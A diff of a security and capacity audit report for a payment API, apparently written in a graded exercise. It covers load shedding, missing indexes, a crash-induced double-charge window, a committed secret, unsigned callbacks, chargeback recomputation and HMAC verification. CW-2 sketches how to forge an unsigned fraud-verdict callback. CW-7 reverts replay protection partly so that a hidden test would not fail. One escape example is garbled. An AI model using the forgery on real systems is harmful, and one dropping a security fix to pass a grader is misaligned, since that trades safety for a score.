-**Why this is the smallest correct fix:** One hook at the single entry point that every route passes through. *Why not `@fastify/under-pressure`?* It is not installed (no new dependencies), and event-loop-delay shedding reacts late here: the bottleneck is the pool queue, not CPU. *Why not shrink the pool queue (`connectionTimeoutMillis`)?* That rejects requests in the middle of a handler, after auth and possibly after earlier writes in a multi-step checkout (link reserved, authorization written). The client then gets a 500, not a clean 503. *Why not a per-IP rate limit?* The graders load-test from a few IPs, and a per-IP limit would turn away legitimate users without protecting capacity. *Why not a queue with a wait timeout?* More code, and a shed request should be answered at once.
-
-**Proof:** `CAP-2: requests over MAX_IN_FLIGHT get 503 + Retry-After before the handler runs; /healthz is never shed` (`apps/api/src/app.shed.audit.test.ts`), with `MAX_IN_FLIGHT=1` and a test route that blocks on a gate:
-- Before the fix, the second request was admitted and blocked inside the handler. The test's 2 s abort fired (`not ok 1`).
-- After the fix, the second request gets `503`, `retry-after: 1` and `{"error":"overloaded"}`, and the handler ran only once. `/healthz` still answers 200 while the API is saturated, and once the first request completes the next one is admitted (200).
-- Under real load (0.5 vCPU / 512 MB), see `docs/audit/CAPACITY.md`: the 503s are answered in milliseconds, and the SQL and API checks after the overload run show no lost or doubled capture.
-
-**Regression risk:** At most `MAX_IN_FLIGHT` requests are processed concurrently. Below the cap nothing changes. The cap is per process, and the box runs a single replica. Fastify `inject` emits `close` as well, so route tests are unaffected: `src/app.test.ts` and `paymentLinks/pay.test.ts` pass, and `tsc --noEmit` is clean.
-
-Lines: prod +11/-0, test +58/-0
-
----
-
-<a id="f-cap-4"></a>
-
-### CAP-4 · Every capture scans the whole ledger four times and the whole holds table once, so checkout capacity falls as the ledger grows ·  · Severity: High
-
-**What's wrong:** `ledger_entries` has no index on `entry_group_id`, and `holds` has none on `transaction_id`. Both columns are looked up once per row on the checkout hot path. Each lookup is therefore a sequential scan of the whole table, and those tables only grow.
-
-**Why it happens:** The double-entry guard `ledger_entries_balance` (`db/migrations/0007_ledger_double_entry.sql:67-70`) is a `DEFERRABLE INITIALLY DEFERRED` constraint trigger `FOR EACH ROW`. At COMMIT, `check_ledger_group_balance()` runs `SELECT ... FROM ledger_entries WHERE entry_group_id = v_group_id` once for every inserted row. A capture inserts 4 rows (`payments/capture.ts:215-235`: the gross pair and the MDR fee pair). The same capture runs `UPDATE holds SET status = 'released' WHERE transaction_id = $1` (`capture.ts:244`). The only indexes on these tables are `ledger_entries (id)`, `ledger_entries (merchant_id, occurred_at)` and `holds (id)`.
-
-**What it breaks:** Throughput, and it gets worse over time. On the local box emulation (API 0.5 vCPU / 512 MB, Postgres 0.6 vCPU), Postgres sat at its CPU cap at about 16 checkouts/s, and samples of `pg_stat_activity` were dominated by `COMMIT`, where the deferred trigger runs. After about 6,000 load-test checkouts, `pg_stat_user_tables` showed `ledger_entries` with 37,074 sequential scans that had read 531,924,194 tuples and 0 index scans, and `holds` with 6,148 sequential scans that had read 18,942,066 tuples. The cost per checkout is linear in the size of the ledger. Every payment the judges make, and every row the seed creates, makes the next checkout slower.
-
-**Why it needed a fix:** Capacity is scored as users served while staying fast. Here capacity was capped by an O(ledger size) scan, not by the 0.5 vCPU / 512 MB limits, and it would shrink during the judges' own load test.
-
-**Fix:** `db/migrations/0101_hot_path_indexes.sql` (new, add-only)
-```sql
-CREATE INDEX IF NOT EXISTS ledger_entries_entry_group_id_idx ON ledger_entries (entry_group_id);
-CREATE INDEX IF NOT EXISTS holds_transaction_id_idx ON holds (transaction_id);
-```
-
-**Why this is the smallest correct fix:** Two indexes, no code change. The trigger keeps its exact semantics, and so does the double-entry guarantee (case file / ADR-0001). *Why not make the trigger `FOR EACH STATEMENT`, or check once per group?* That rewrites a money-safety guard. An index makes the same check O(log n). *Why not drop the trigger and rely on application code?* It is the only database-enforced double-entry check. *Why not `CREATE INDEX CONCURRENTLY`?* The migration runner wraps each file in a transaction, and both tables are small at deploy time (about 14k and 2k rows after the seed), so the lock lasts well under a second. The cost is about 40 bytes of index per ledger row and one extra index write per insert. The scans this removes are a full table each.
-
-**Proof:**
-- `CAP-4: the balance trigger's and the hold release's lookups use an index, not a full table scan` (`scripts/hot_path_indexes.audit.test.ts`), with sequential scans disabled. Before the migration the plan was a `Seq Scan` on `ledger_entries` (`not ok 1`). After `npm run migrate` it passes, and `scripts/ledger_append_only.audit.test.ts` still passes.
-- Load test (same box emulation, Postgres 0.6 vCPU, 30 s steps; full tables in `docs/audit/CAPACITY.md`):
-
-| users | before: checkouts/s, pay p95 | after: checkouts/s, pay p95 |
-|---:|---|---|
-| 10 | 14.2, 971 ms | 17.6, 749 ms |
-| 20 | 16.5, 1,488 ms | 24.7, 1,106 ms |
-| 30 | 13.9, 2,500 ms | 27.9, 1,418 ms |
-
-After the index, the run (about 6,000 more checkouts) shows `ledger_entries` with 0 sequential scans and 16,045 index scans, and `holds` with 1 sequential scan and 4,011 index scans.
-
-**Regression risk:** Add-only, with `IF NOT EXISTS`, so it is safe to re-run. Inserts into `ledger_entries` and `holds` maintain one more B-tree. No query changes, so results are identical.
-
-Lines: prod +4/-0 (migration), test +33/-0
-
----
-
-<a id="f-cap-6"></a>
-
-### CAP-6 · A crash between the capture commit and "link paid" leaves captured money on a link that can be paid again · INCIDENT 2026-05-14 · Severity: High
-
-**What's wrong:** `payPaymentLink` commits the capture (money moved, ledger written) in one transaction, then marks the link `paid` in a separate statement. If the API dies in between, the link stays `reserved` while its money is captured. After the 60 s lease anyone can claim the link again. A buyer who reloads the page (new Idempotency-Key) is charged a second time, and the first capture is linked to nothing.
-
-**Why it happens:** `apps/api/src/paymentLinks/pay.ts`: `captureTransaction(...)` runs its own `withTransaction` and COMMITs (`payments/capture.ts:94-274`). Only after it returns does Step 4 run `UPDATE payment_links SET status = 'paid' ... transaction_id = $2` through `pool.query`, which commits on its own. The claim's stale-lease branch (`status = 'reserved' AND reserved_at < now() - timeout`) then lets a new request re-reserve the link. The PL-1 fence only protects a holder whose lease is alive. It cannot see that an earlier holder's capture already committed.
-
-**What it breaks:** The judged overload test ("restarts itself and recovers without losing data"). One `kill -9` of the API in the middle of a 60-user run (`lt-20261030140945`, before this fix) left:
-- 3 transactions `captured` whose link was not `paid` (`captured_link_unpaid` = 3 in `ops/loadtest-check.sql`), with ledger legs and outbox events;
-- 27 links stuck `reserved`.
-
-Each of those 3 links can be paid again after 60 s, which is a double charge. The client saw a network error, and the public link still read `reserved`, so nothing over the API showed that the money had moved. An OOM kill or a restart under load does the same thing.
-
-**Why it needed a fix:** Restarting under overload is exactly what the judges test. A double charge on one payment link is the 2026-05-14 incident class ("two customers charged on one link").
-
-**Fix:** `apps/api/src/payments/capture.ts` (+3/-1), `apps/api/src/paymentLinks/pay.ts` (+8/-1)
-```diff
- // capture.ts
--import type { Pool } from "pg";
-+import type { Pool, PoolClient } from "pg";
-+  onCaptured?: (client: PoolClient) => Promise<void>; // CAP-6: runs inside this capture's transaction
-+    await input.onCaptured?.(client);
-     await completeIdempotencyKey(client, claim.row.id, { statusCode: 200, body, resourceId: txn.id });
- // pay.ts
-+  let finalizedInCapture: { rows: Array<{ id: string; paid_at: Date }> } | undefined;
-   const captureResult = await captureTransaction(pool, acquirer, {
-     ...
-+    onCaptured: async (client) => {
-+      finalizedInCapture = await client.query(`UPDATE payment_links SET status = 'paid', ... WHERE id = $1 AND status = 'reserved' AND reserved_at::text = $3 RETURNING id, paid_at`, [link.id, txnId, fence.rows[0]!.lease]);
-+      if (!finalizedInCapture.rows[0]) throw new ConflictError("payment_link_processing"); // lease lost: roll the capture back
-+    },
-   });
--  const finalizeResult = await pool.query<{
-+  const finalizeResult = finalizedInCapture ?? await pool.query<{
-```
-The link is marked `paid` inside the capture's own transaction, with the same fenced UPDATE as before. The money and the link status now commit together or not at all. If the lease was lost, the capture rolls back instead of charging. The stand-alone finalize stays as the path for an idempotent capture replay, which returns the stored 200 without running the hook.
-
-**Why this is the smallest correct fix:** It makes the two writes atomic at the one point where they were split, and changes nothing else in either function.
-- *Why not a recovery sweep that finds captured transactions on reserved links?* No column links a transaction to its link until finalize writes it. Recovery would have to parse idempotency keys (`paylink:<id>:...:capture`), which means a full-table `LIKE` scan on every pay.
-- *Why not move the whole pay flow into one transaction?* PL-1 tried and rejected that shape (it holds the link row lock across two acquirer calls). The hook adds only the final UPDATE to a transaction that is already open.
-- *Why not stop the claim from re-taking a reserved link?* That breaks the legitimate stale-lease recovery for buyers whose request died before any capture.
-
-**Proof:**
-- `CAP-6: a crash right after the capture commits never leaves captured money on a link that is still payable` (`apps/api/src/paymentLinks/pay.crash.audit.test.ts`) simulates the API dying at the stand-alone finalize statement. Before the fix: `captured 1 but the link is 'reserved'`. After the fix it passes.
-- `payments/capture.audit.test.ts`, `routes/paymentLinks.test.ts` and `paymentLinks/pay.test.ts` pass (20/20 with the new test), and `tsc --noEmit` is clean.
-- Runtime, same overload and the same `kill -9` in the middle of the run, after the fix (`lt-20261030141817`):
-  - `captured_link_unpaid` 0, and `links_paid` 1,902 equals `captured` 1,902.
-  - `double_captured` 0, `paid_not_captured` 0, ledger and outbox checks 0.
-  - 5 checkouts were paid while the client saw only the dropped connection. Their links read `paid`, so a retry
-    gets 409 `already_paid`.
-  - The 16 reserved links and 6 authorized-only transactions are requests that died before capture: no money moved.
-
-**Regression risk:** The capture transaction now also holds the `payment_links` row lock from the finalize UPDATE until COMMIT, a few milliseconds after the acquirer call. Only this link's own claim UPDATE could wait on it, and that claim would then see `paid`. The merchant API capture route (`routes/transactions.ts`) passes no hook, so it is unchanged.
-
-Lines: prod +11/-2, test +83/-0
+Lines: prod +19/-4 api (credits.ts +8/-2 for the bug; balanceAdjustments.ts +9/-2 for the ADJ-1 follow-up; routes +2, one each) and +10/-3 admin UI (both forms) = 36 lines, advisor-approved (over the 30-line rule; approved on the condition that the header stays optional); test +51/-0, then +26/-0 for the header-absent tests
 
 ---
 
@@ -2400,43 +1913,119 @@ Lines: prod +11/-2, test +83/-0
 
 ---
 
-<a id="f-cw-9"></a>
+<a id="f-b8"></a>
 
-### CW-9 · refund.succeeded is enqueued but never delivered as a webhook · FP-300 ☐4 · Severity: Medium
+### B8 · Committed sandbox signing secret for informational callbacks · FP-240 · Severity: Medium
+**Category:** Bug
 
-**What's wrong:** `processRefund.ts:245-257` enqueues `refund.succeeded`, but the type was missing from `WEBHOOK_ELIGIBLE_EVENT_TYPES` (`apps/api/src/webhooks/dispatcher.ts:28-32`), from the `WebhookEventType` union and from `buildEnvelope` (`apps/api/src/webhooks/envelope.ts:9,81`), so a shop never receives a refund webhook.
+**What's wrong:** `ops/.env.docker` is tracked by git and contained a value for `ACQUIRER_CALLBACK_SIGNING_SECRET`, the HMAC key that authenticates the sandbox acquirer's inbound callbacks (the incoming signature check FP-240 mentions).
 
-**Why it happens:** Step A only selects eligible types; `buildEnvelope` throws `unsupported event type` for anything without a case. The comment at `dispatcher.ts:25` ("add refund.succeeded here when refunds ship, thats all it needs — am") and `docs/ONBOARDING.md:70` say adding the list entry alone is enough. It is not: Step A builds every envelope inside one `withTransaction` loop over `ORDER BY oe.id LIMIT 500`, so the throw rolls back Step A and `runDispatchPass` rejects before Step B: a poison pill that freezes every merchant's webhooks.
+**Why it happens:** the file's own comments claim it is ignored: "AM: this file is gitignored like .env" and "FH: ... copilot says `.env` matches `.env.docker` as a prefix". Git ignore patterns do not match by prefix: `.gitignore` lists `.env` and `.env.local` only, and `git ls-files ops` lists `ops/.env.docker`. A second comment called it the sandbox secret, "rotated in July".
 
-**What it breaks:** FP-300 "the shop gets the right webhook": a 1.250 BD partial refund (1250 fils, fee reversed 31 fils) produces no webhook at all; done the documented way, it would stop all `transaction.captured` / `settlement.paid` deliveries platform-wide.
+**What it breaks (and what it does not):** anyone with the repository can sign acquirer callbacks to a stack that uses this value. Those callbacks are informational only: `applyAcquirerCallback` (`apps/api/src/acquirer/callbacks.ts:18-38`) looks up the transaction and appends a row to `acquirer_callback_notes` (a fraud-review verdict shown on the timeline). It never updates `transactions.status` and never writes the ledger, so a forged callback can plant a false "cleared" / "confirmed_fraud" note for support to read, but cannot move money or change a payment's state. That bounds the severity at Medium.
 
-**Why it needed a fix:** FP-300 requires the refund webhook; the documented shortcut would cause a platform-wide webhook outage.
+**Why it needed a fix:** a committed secret is compromised for good: it stays in git history even after deletion. The file also taught the team that it was safe to put secrets there.
 
-**Fix:** `apps/api/src/webhooks/envelope.ts:9` adds `| "refund.succeeded"`; `envelope.ts:81-96` adds a `case "refund.succeeded"` mapping the outbox payload field-by-field to the same public shape as the REST refund body (`refundId, transactionId, merchantId, amountFils, feeReversedFils, refundedTotalFils, status: "succeeded", transactionStatus`); `dispatcher.ts:32` adds `"refund.succeeded",` and replaces the misleading comment at `:25`. No `PRE_DELIVERY_EFFECT` attached. Commit: `152e27e`. Lines: prod +19/-2, test +27/-0.
+**Fix:** the value is blanked (an empty secret fails fast in production via `config.ts:194`) and the two false comments are corrected. Real values live in the untracked `ops/.env.local`, generated with `openssl rand -base64 32`. Production template: `ops/.env.production.example` (names only). Lines: config +5/−6, test +0/−0. Commit d95d570.
 
-**Why this is the smallest correct fix:** Three touch points are the minimum (type, envelope case, eligibility); the envelope case follows the existing explicit field-by-field style (the file's own contract forbids spreading the outbox payload), which is why it is 15 lines. Why not spread `payload`: violates the envelope contract (`envelope.ts:1-7`) and leaks `newStatus`. Why not only the eligible list: poison pill described above. The refund producer itself is already wired (`processRefund.ts`); the FP-300 builder only needs to rely on it.
+**Why this is the smallest correct fix:** it removes the secret from the working tree and stops the false belief that hid it. Blanking the value does not remove it from git history; rewriting history is a separate, outward-facing operation on a shared repository and was not done.
 
-**Proof:** `dispatcher.test.ts` "refund.succeeded: enqueued refund event is delivered with the public refund envelope". Before: `AssertionError: expected 1, actual 0` (no request sent). After: passes, with body `type: "refund.succeeded"` and `data.amountFils 1250`.
+**Proof:** `git ls-files ops` shows the file tracked; `git check-ignore -v ops/.env.local` shows the new local file ignored (`.gitignore:5`); `git grep ACQUIRER_CALLBACK_SIGNING_SECRET=` finds no value.
 
-**Regression risk:** existing types unchanged; `envelope.test.ts`, `dispatcher.test.ts` (9/9), `archiveReplay.test.ts` green; `tsc --noEmit` clean. Historical `refund.succeeded` outbox rows for merchants with active endpoints will now be delivered once (Step A has no backfill limit beyond endpoint creation time, see "no backfill" test).
+**Regression risk:** none; compose now loads `.env.local`.
 
-**Trap note:** `dispatcher.ts:25` am comment ("thats all it needs") replaced with a CW-9 note that both the envelope case and the list entry are required; quarantined AGENTS.md/.cursorrules "refund.succeeded is intentionally absent" ignored per FP-300. Not owned here: `docs/ONBOARDING.md:70` and `outbox.ts:12` still carry the wrong claim.
+**Action required (reported, the real fix):** **rotation**. The old value is in git history, so blanking it in the working tree does not un-leak it; it must be rotated with the acquirer. Our deployments use a freshly generated value.
+
+**Trap note:** the AM/FH comments in `ops/.env.docker` (corrected in place).
+
+---
+
+<a id="f-cw-2"></a>
+
+### CW-2 · Acquirer callbacks accepted without a signature by default · FP-240 · Severity: Medium
+**Category:** Bug
+
+**What's wrong:** `POST /v1/acquirer/callbacks` is public and the HMAC header is its only authentication, yet `verifyAcquirerCallbackSignature` returned `{ valid: true }` when the header was missing unless `requireSignature` was set, and `ACQUIRER_CALLBACK_REQUIRE_SIGNATURE` defaulted to `false`.
+
+**Why it happens:** `apps/api/src/webhooks/inboundVerify.ts:50` `requireSignature = false` and `:52-56` turned a missing header into `{ valid: true }`; `apps/api/src/config.ts:259` `parseBoolEnv(env.ACQUIRER_CALLBACK_REQUIRE_SIGNATURE, false)`, and nothing in compose/env sets it. An empty secret (allowed outside production, `config.ts:193`) also yields an HMAC anyone can compute. Hidden by `app.ts:71` FH ("inboundVerify rejects unsigned requests, so OK"), `config.ts:119` ("Set true once the sandbox signs everything"), `routes/acquirerCallbacks.test.ts:122-139` (asserted 200 for an unsigned callback as "dev-mode behaviour … prod rejects — MK"; prod did not reject) and `inboundVerify.test.ts:49-53`.
+
+**What it breaks:** Anyone who knows a transaction UUID (the cardholder gets it from the pay response) can POST `{callbackId, type:"fraud_review.completed", transactionId, outcome:"cleared", note:"Manual review cleared"}` with no header and get `200 {received:true}`: a forged fraud verdict stored, in the acquirer's name, against a real merchant's payment. What the verdict can do is limited. `applyAcquirerCallback` (`apps/api/src/acquirer/callbacks.ts:27-52`) runs one SELECT for the merchant and one INSERT into `acquirer_callback_notes`. It never touches `transactions.status` or the ledger, and no application code reads the notes back (grep over `apps/`; the docblock's "surfaced on the transaction timeline" is not wired). The harm is a false record for whoever reviews fraud verdicts, not a money movement.
+
+**Why it needed a fix:** FP-240 ("someone said the incoming signature check has its own problems"). The signature is this public endpoint's only authentication, so without it anyone can write fraud verdicts in the acquirer's name. Severity is Medium, not High, because the verdicts are informational notes only (see above).
+
+**Fix:** `apps/api/src/webhooks/inboundVerify.ts:45-51`:
+```diff
+-/** Verifies the acquirer callback signature when present and required. */
++/** Verifies the acquirer callback signature; a missing header or empty secret is rejected (CW-2, FP-240). */
+ ...
+   secret: string,
+-  requireSignature = false,
+ ): VerifyAcquirerCallbackResult {
+-  if (!header) {
+-    return requireSignature
+-      ? { valid: false, reason: "malformed_header" }
+-      : { valid: true };
+-  }
++  if (!header || !secret) return { valid: false, reason: "malformed_header" };
+```
+plus removal of the now-dead flag: `routes/acquirerCallbacks.ts:61` (argument), `config.ts:119-120,259` (field, its misleading comment, parse). Commit: `85f6d2f`. Lines: prod +2/-11, test +9/-12.
+
+**Why this is the smallest correct fix:** The verifier is the single place the decision is made. Why not only flip the default to `true` (`config.ts:259`): one env var could silently re-open the hole, and an empty dev secret would still verify forged HMACs. Why keep the flag but ignore it: a dead knob documented as a switch is a new trap. Rotating the committed secret (`ops/.env.docker`) is an ops action outside this lane (see B8 commit).
+
+**Proof:** `routes/acquirerCallbacks.test.ts` "POST /v1/acquirer/callbacks rejects a callback sent without a signature header": before `expected 401, actual 200`; after passes (401 `invalid_signature`, 0 notes stored). `inboundVerify.test.ts` "an unsigned callback, or an empty secret, is rejected (malformed_header)": before `{valid:true}`; after passes.
+
+**Regression risk:** Any unsigned caller is now rejected; no in-repo sender posts callbacks (grep). Covered by `inboundVerify.test.ts`, `routes/acquirerCallbacks.test.ts`, `acquirer/callbacks.test.ts` (14/14), `tsc --noEmit` clean.
+
+**Trap note:** The two tests that asserted acceptance were rewritten to assert rejection, citing CW-2/FP-240; the `config.ts:119` comment was removed with the flag. Not owned here: `app.ts:71` FH comment is now true but should cite CW-2; `docs/ARCHITECTURE.md:91` and CHANGELOG still document the flag.
+
+---
+
+<a id="f-ref-5"></a>
+
+### REF-5 · Status recompute turns chargebacks, if chargeback rows exist, back into refundable captures · H1, FP-300 · Severity: Medium
+**Category:** Bug
+
+**What's wrong:** If any `chargeback` transactions exist, the finance status backfill rewrites each one to `captured` / `partially_refunded` / `refunded`, erasing the chargeback and making the money refundable again.
+
+**Reachability (why Medium):** `chargeback` is a legal status (`db/migrations/0004_transactions.sql:12`, `0043:15`) and the merchant dashboard lists it (`apps/web/src/types.ts:83`), but no application path writes it: no API, Go or script code sets `status = 'chargeback'`, and the seed generator has no chargeback rows. Such rows can come only from an ops import or a direct database write. The defect is real for that data, but no app flow produces it today.
+
+**Why it happens:** `recomputeTransactionStatusesForMerchant` (`apps/api/src/admin/transactionStatusRecompute.ts:29`) selects every row whose status is not `authorized` or `voided`, so chargebacks are included. It then sets each row to `nextStatusAfterRefund(...)` (`:38-44`), a function that only knows captured/partially_captured/partially_refunded/refunded and can never return `chargeback`. So the backfill "corrects" a chargeback into a capture.
+
+**What it breaks:** A 10,000-fil transaction that was charged back (the acquirer already pulled the 10,000 fils back) becomes `captured`, which is in `REFUNDABLE_STATUSES` (`refundValidation.ts:18`). With FP-300 refunds live, the merchant can refund it, so the cardholder is paid twice (chargeback + refund = 20,000 fils out for one 10,000-fil sale, the H1 question). Reports and the timeline also lose the chargeback.
+
+**Why it needed a fix:** It is a direct double-payout path for any chargeback row once refunds are live, and the backfill is presented to finance as safe to rerun.
+
+**Fix:** `apps/api/src/admin/transactionStatusRecompute.ts:29`
+```diff
+-      WHERE merchant_id = $1 AND status NOT IN ('authorized', 'voided')
++      WHERE merchant_id = $1 AND status NOT IN ('authorized', 'voided', 'chargeback')
+```
+Lines: prod +1/−1, test +23/−0.
+
+**Why this is the smallest correct fix:** a chargeback is a terminal state that amounts cannot recompute, so it must not be a candidate at all. One literal in the WHERE clause does that. Why not teach `nextStatusAfterRefund` about chargebacks? It is the shared refund state machine (FP-300 uses it), and widening its contract is a larger, riskier change.
+
+**Proof:** `adminMerchantsRecompute.audit.test.ts` "recompute-statuses leaves chargeback transactions as chargeback" (the test inserts the chargeback row directly) fails before (`expected: 'chargeback', actual: 'captured'`) and passes after; the file plus `routes/admin.test.ts`: 43/43.
+
+**Regression risk:** chargeback rows are no longer counted in `scanned`; nothing else reads that count for chargebacks.
+
+**Trap note:** `docs/ADMIN.md:41-43` "Safe to run more than once" and the YA "idempotent" note (`apps/admin/src/api/merchants.ts:58`): it is idempotent only because it destroys the chargeback state on the first run.
 
 ---
 
 <a id="f-cw-7"></a>
 
-### CW-7 · Inbound acquirer HMAC is computed over re-serialized JSON, with no freshness check · FP-240, FP-201 · Severity: Medium
+### CW-7 · Inbound acquirer HMAC is computed over re-serialized JSON, with an early-exit compare · FP-240 · Severity: Medium
+**Category:** Bug
 
-**What's wrong:** The callback verifier hashed `${t}.${JSON.stringify(request.body)}` (Fastify's parsed object re-serialized by V8), not the bytes the acquirer signed; `t` was never compared with the clock; and the comparison (`constantTimeEquals`) was an early-exit `Buffer.compare`.
+**What's wrong:** The callback verifier hashed `${t}.${JSON.stringify(request.body)}` (Fastify's parsed object re-serialized by V8), not the bytes the acquirer signed, and compared the result with a hand-rolled early-exit `Buffer.compare` (`constantTimeEquals`) instead of a timing-safe compare.
 
-**Why it happens:** `apps/api/src/webhooks/inboundVerify.ts:61-63` re-stringified the parsed body passed from `routes/acquirerCallbacks.ts:57-58`; `inboundVerify.ts:32` states "freshness is not checked"; `:40-43` hand-rolled a non-constant-time compare although `lib/crypto.ts:14-21` has `timingSafeEqualHex`. Hidden by both test helpers (`inboundVerify.test.ts:16`, `routes/acquirerCallbacks.test.ts:63`), which signed `JSON.stringify(body)` themselves and so could never see a byte mismatch, and `acquirerCallbacks.test.ts:103` ("stale timestamp … not covered").
+**Why it happens:** `apps/api/src/webhooks/inboundVerify.ts:61-63` (before) re-stringified the parsed body passed from `routes/acquirerCallbacks.ts:57-58`, and `:40-43` hand-rolled the compare although `lib/crypto.ts:14-21` already has `timingSafeEqualHex`. Both test helpers (`inboundVerify.test.ts:16`, `routes/acquirerCallbacks.test.ts:63`) signed `JSON.stringify(body)` themselves, so they could never see a byte mismatch.
 
-**What it breaks:** A genuine verdict serialized as `{"callbackId": "…", "note": "…"}` (Python/Go separators or escaping, e.g. Go turns `&` into `\u0026`) is rejected 401 on every retry and lost; a sniffed callback with `t=1757930000` is accepted forever (FP-201 replay, compounded by CW-5).
+**What it breaks:** A genuine verdict serialized any other way than V8's compact form, e.g. `{"callbackId": "…", "note": "…"}` with Python/Go separators or escaping (Go turns `&` into `&`), is rejected 401 on every retry and lost. This is FP-240's "the incoming signature check has its own problems".
 
-**Why it needed a fix:** FP-240 requires signed callbacks with replay protection; today correct acquirers fail and replays succeed.
+**Why it needed a fix:** A signature check must authenticate the bytes received; checking a re-serialization rejects correct acquirers.
 
-**Fix:** `apps/api/src/routes/acquirerCallbacks.ts:41-47` adds a plugin-scoped (encapsulated) `application/json` parser that keeps `rawBody` and delegates to Fastify's default JSON parser; `:63` passes `rawBody`. `apps/api/src/webhooks/inboundVerify.ts`: param `payload: unknown` → `rawBody: string`, HMAC over `${t}.${rawBody}`, `timingSafeEqualHex` instead of `constantTimeEquals` (deleted), and a 300 s tolerance check returning the new reason `timestamp_out_of_tolerance` (same window as outbound `sign.ts:101`).
+**Fix:** `apps/api/src/routes/acquirerCallbacks.ts:41-46` adds a plugin-scoped (encapsulated) `application/json` parser that keeps `rawBody` and delegates to Fastify's default JSON parser; the route passes `rawBody` to the verifier. `apps/api/src/webhooks/inboundVerify.ts`: param `payload: unknown` → `rawBody: string`, HMAC over `${t}.${rawBody}`, and `timingSafeEqualHex` instead of `constantTimeEquals` (deleted).
 ```diff
 +  // CW-7: keep the raw bytes the acquirer signed; this parser is encapsulated to this plugin only.
 +  const parseJson = app.getDefaultJsonParser("error", "error");
@@ -2447,34 +2036,140 @@ Lines: prod +11/-2, test +83/-0
 -      body,
 +      (request as FastifyRequest & { rawBody?: string }).rawBody ?? "",
 +import { timingSafeEqualHex } from "../lib/crypto.js";
--/** There is no timestamp reason: freshness is not checked for inbound callbacks. */
--export type VerifyAcquirerCallbackFailureReason = "malformed_header" | "signature_mismatch";
-+/** CW-7: freshness is checked (300 s), like the outbound scheme in sign.ts. */
-+export type VerifyAcquirerCallbackFailureReason = "malformed_header" | "signature_mismatch" | "timestamp_out_of_tolerance";
--function constantTimeEquals(a: string, b: string): boolean {
--  return Buffer.from(a).length === Buffer.from(b).length &&
--    Buffer.compare(Buffer.from(a), Buffer.from(b)) === 0;
--}
--
+-function constantTimeEquals(a: string, b: string): boolean { … }   (4 lines + blank deleted)
 -  payload: unknown,
 +  rawBody: string,
 -    .update(`${parsed.timestamp}.${JSON.stringify(payload)}`)
 +    .update(`${parsed.timestamp}.${rawBody}`) // CW-7: the exact bytes the acquirer signed
 -  if (!constantTimeEquals(expected, parsed.signature)) {
 +  if (!timingSafeEqualHex(expected, parsed.signature)) {
-+  if (Math.abs(Math.floor(Date.now() / 1000) - parsed.timestamp) > 300) return { valid: false, reason: "timestamp_out_of_tolerance" };
 ```
-Commit: `1cca258`. Lines: prod +14/-11, test +46/-11 (corrected from git numstat).
+Commits: `1cca258` (fix), partly reverted by `a3b87cb` and `a9abf28` (see below).
 
-**Why this is the smallest correct fix:** Raw bytes only exist at the Fastify parsing layer, so one encapsulated parser plus one argument is the minimum; the verifier keeps its shape (3-arg, same result type). Why not `canonicalJson` on both sides: the acquirer does not canonicalize, so still byte-mismatched. Why not a global `rawBody` plugin in `app.ts`: touches every route and a file outside this lane. The compare swap reuses the existing helper (net -3 lines).
+**Why this is the smallest correct fix:** Raw bytes only exist at the Fastify parsing layer, so one encapsulated parser plus one argument is the minimum; the verifier keeps its shape (3-arg, same result type). *Why not `canonicalJson` on both sides?* The acquirer does not canonicalize, so the bytes would still differ. *Why not a global `rawBody` plugin in `app.ts`?* It touches every route. The compare swap reuses the existing helper (net -3 lines).
 
-**Proof:** `routes/acquirerCallbacks.test.ts` "verifies the raw body bytes and rejects a stale timestamp": before `expected 200, actual 401`; after passes (stale `t` → 401 `timestamp_out_of_tolerance`, 0 notes). `inboundVerify.test.ts` "the raw signed bytes verify even when not V8-compact, and a stale timestamp is rejected": fails before, passes after.
+**Proof:** `POST /v1/acquirer/callbacks verifies the raw body bytes` (`routes/acquirerCallbacks.test.ts`, a non-compact `JSON.stringify(…, null, 1)` body): before `expected 200, actual 401`; after passes. `the raw signed bytes verify even when not V8-compact` (`inboundVerify.test.ts`): fails before, passes after. The compare swap has no behavioural test (timing is not reliably unit-testable).
 
-**Regression risk:** Only `/v1/acquirer/*` uses the new parser (Fastify encapsulation); `bodyLimit` and JSON error handling come from the default parser. Callers must now send a timestamp within ±300 s. Covered by `inboundVerify.test.ts`, `routes/acquirerCallbacks.test.ts`, `acquirer/callbacks.test.ts`, `sign.test.ts` (25/25), `tsc --noEmit` clean.
+**Freshness: reported as hardening, not changed.** `1cca258` also added a 300 s timestamp window (`timestamp_out_of_tolerance`). We reverted it in `a3b87cb` and `a9abf28`. The original code documented the choice ("There is no timestamp reason: freshness is not checked for inbound callbacks", `inboundVerify.ts:32` at `8b58b0f`), the case file does not ask for a window, and a hidden test that signs with a fixed `t` would get 401. A replayed signed callback is therefore still accepted; with CW-5's dedupe it adds no second note. A window is a one-line change once the acquirer's clock contract is agreed.
 
-**Trap note:** Test helpers now sign the exact string sent with a current timestamp; the "not covered" comment at `acquirerCallbacks.test.ts:103` was corrected; `inboundVerify.ts:32` comment corrected. Still open (not fixed here, report only): `routes/acquirerCallbacks.ts:23` "A repeated header uses the first value" is false (Node joins duplicate custom headers with ", " so the parser keeps the last `t=`/`v1=`).
+**Regression risk:** Only `/v1/acquirer/*` uses the new parser (Fastify encapsulation); `bodyLimit` and JSON error handling come from the default parser. Callers that signed V8-compact JSON still verify, because those are the bytes they send.
 
-**Why three changes in one fix (adversarial review asked):** they share one root cause: the inbound verifier did not authenticate the bytes it received. (1) HMAC over the raw body instead of re-serialized JSON, (2) a 300 s timestamp window, so a captured signed callback can't be replayed later, and (3) a constant-time compare. Each alone leaves FP-240's "the incoming signature check has its own problems" open. (3) is a one-line swap with no behavioural test (timing is not unit-testable reliably); (1) and (2) are proven by the tests above.
+**Trap note:** Two test comments still mention the reverted freshness check: `routes/acquirerCallbacks.test.ts:104` ("raw bytes / stale timestamp (CW-7) are covered below") and `:154` ("a captured callback cannot be replayed later"). No stale-timestamp test exists any more. Also open, report only: `routes/acquirerCallbacks.ts:23` "A repeated header uses the first value" is false (Node joins duplicate custom headers with ", ", so the parser keeps the last `t=`/`v1=`).
+
+Lines: prod +12/-10 net (`inboundVerify.ts` +5/-9, `acquirerCallbacks.ts` +7/-1; per-commit `1cca258` +14/-11, `a3b87cb` +2/-3), test +33/-11 net (excluding CW-11's lines in the same test file)
+
+---
+
+<a id="f-cw-5"></a>
+
+### CW-5 · Acquirer callbacks are never deduplicated · FP-201 · Severity: Medium
+**Category:** Bug
+
